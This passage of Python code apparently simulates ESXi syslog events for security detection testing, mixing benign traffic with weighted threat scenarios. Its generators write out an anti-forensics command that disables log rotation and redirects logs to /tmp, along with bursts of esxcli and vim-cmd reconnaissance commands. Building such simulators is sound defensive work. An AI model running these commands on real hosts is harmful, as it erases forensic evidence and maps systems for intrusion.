            f"Event {random.randint(900000, 999999)} : SNMP agent enabled with trap target "
            f"{ext}:162 on {host} by {actor}@{src}", opid=_opid(), user=actor),
    ]


def _log_rotation_disabled(config, session_context=None):
    """Syslog rotation neutered (size/rotate 0) or the log dir redirected to a volatile
    path — anti-forensics that keeps the host 'logging' while nothing is retained."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context)
    return [
        _cmd_line(config, host, "/bin/esxcli system syslog config logger set -i hostd --size 0 --rotate 0"),
        _hostd_line(config, host, "info", "Vimsvc",
            'Set called with key "Syslog.global.logDir", value "/tmp"', opid=_opid(), user=actor),
        _vobd_line(config, host, "vob.user.syslog.config.changed",
            "Syslog configuration has changed; log rotation disabled."),
    ]


def _config_harvest(config, session_context=None):
    """One session pulling the whole host configuration in a burst — scripted recon /
    config harvesting (many esxcli / vim-cmd get/list in seconds from one source)."""
    host = random.choice(_hosts(config))
    reads = ["/bin/esxcli system settings advanced list", "/bin/esxcli network firewall ruleset list",
             "/bin/esxcli system account list", "/bin/esxcli system permission list",
             "/bin/vim-cmd vmsvc/getallvms", "/bin/esxcli storage filesystem list",
             "/bin/esxcli network ip interface list", "/bin/esxcli system snmp get",
             "/bin/vim-cmd hostsvc/hostsummary", "/bin/esxcli software vib list"]
    return [_cmd_line(config, host, c)
            for c in random.sample(reads, k=random.randint(6, len(reads)))]


def _permission_denied_burst(config, session_context=None):
    """Repeated authorization failures for one identity across operations — privilege
    mapping / recon by a low-priv or stolen account."""
    host = random.choice(_hosts(config))
    user, src = _resolve_admin(config, session_context)
    ops = ["HostConfigManager.firewallSystem", "AccountManager.createUser",
           "HostStorageSystem.rescanAllHba", "HostServiceSystem.startService",
           "DatastoreBrowser.deleteFile", "HostNetworkSystem.updatePortGroup"]
    logs = []
    for _ in range(random.randint(6, 12)):
        logs.append(_hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
            f"Event {random.randint(900000, 999999)} : Permission to perform this operation "
            f"was denied for user {user}@{src} on {random.choice(ops)}", opid=_opid(), user=user))
    return logs


_THREAT_FUNCS = {
    "uncommon_host_command": _uncommon_host_command,
    "vuln_scan": _vuln_scan,
    "ssh_brute_force": _ssh_brute_force,
    "root_login_rare_source": _root_login_rare_source,
    "ssh_service_enabled": _ssh_service_enabled,
    "local_account_created": _local_account_created,
    "mass_vm_power_off": _mass_vm_power_off,
    "remote_syslog_disabled": _remote_syslog_disabled,
    "vm_disk_export": _vm_disk_export,
    "guest_ops_exec": _guest_ops_exec,
    "datastore_upload": _datastore_upload,
    "vm_disk_attach": _vm_disk_attach,
    "kernel_module_load": _kernel_module_load,
    "promiscuous_mode": _promiscuous_mode,
    "unplanned_reboot": _unplanned_reboot,
    "snmp_external_target": _snmp_external_target,
    "log_rotation_disabled": _log_rotation_disabled,
    "config_harvest": _config_harvest,
    "permission_denied_burst": _permission_denied_burst,
}


def _generate_threat_log(config, session_context, forced_event=None):
    if forced_event:
        fn = _THREAT_FUNCS.get(forced_event)
        return fn(config, session_context) if fn else None
    events = [t["event"] for t in _THREATS]
    weights = [t["weight"] for t in _THREATS]
    choice = random.choices(events, weights=weights, k=1)[0]
    return _THREAT_FUNCS[choice](config, session_context)


def _get_threat_interval(threat_level, config):
    """Seconds between threat events for *threat_level*. config.json maps each level
    directly to an int of seconds (e.g. "Realistic": 7200); tolerate a {"seconds": N}
    shape too in case the schema ever changes."""
    val = config.get("threat_generation_levels", {}).get(threat_level, 0)
    if isinstance(val, dict):
        val = val.get("seconds", 0)
    try:
        return float(val)
    except (TypeError, ValueError):
        return 0


def generate_log(config, scenario=None, threat_level="Realistic", benign_only=False,
                 context=None, scenario_event=None):
    """Main entry point. Returns a single syslog string or a list of strings
    (multi-line threats). Transport is syslog (config vmware_esxi_config.syslog_port)."""
    global last_threat_event_time
    session_context = (context or {}).get("session_context")

    # Orchestrator / dashboard scenario override.
    if scenario:
        scenario_event = scenario if isinstance(scenario, str) else scenario.get("name", "")
    if scenario_event:
        return _generate_threat_log(config, session_context, forced_event=scenario_event)

    if benign_only:
        return _benign(config, session_context)

    interval = _get_threat_interval(threat_level, config)
    now = time.time()

    if threat_level == "Insane" and random.random() < 0.8:
        return _generate_threat_log(config, session_context)

    if interval > 0 and (now - last_threat_event_time) > interval:
        last_threat_event_time = now
        return _generate_threat_log(config, session_context)

    return _benign(config, session_context)
